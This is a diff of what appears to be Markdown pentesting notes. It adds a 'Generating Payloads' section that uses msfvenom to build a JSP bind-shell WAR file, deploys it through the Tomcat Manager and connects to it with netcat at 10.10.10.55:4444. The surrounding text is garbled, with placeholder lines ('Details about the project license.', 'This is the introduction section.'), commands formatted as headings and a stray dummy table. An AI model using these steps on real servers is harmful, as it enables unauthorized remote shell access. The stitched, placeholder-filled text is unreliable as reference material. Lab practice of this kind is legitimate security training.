@@ -141,8 +141,16 @@ using: use auxiliary/scanner/http/http_login , we can scan for vulnerabilities
 # Web-Based Attack Surfaces
 Details about the project license.
 
-# Generating Payloads
-This is the introduction section.
+#### Generating Payloads
+To use msfvenom to generate a payload that can trigger TCP bind shell, we use the command line;
+
+#### msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war -o bind_shell.war
+
+We then deploy the WAR file to the Tomcat server. We can do this by accessing the Tomcat Manager interface and uploading the bind_shell.war file.
+Now we can access the bind shell by connecting to the specified port on the target machine. For example, if you set the port to 4444, you can use netcat to connect:
+
+#### nc 10.10.10.55 4444
+
 
 
 | One | Two | Three |
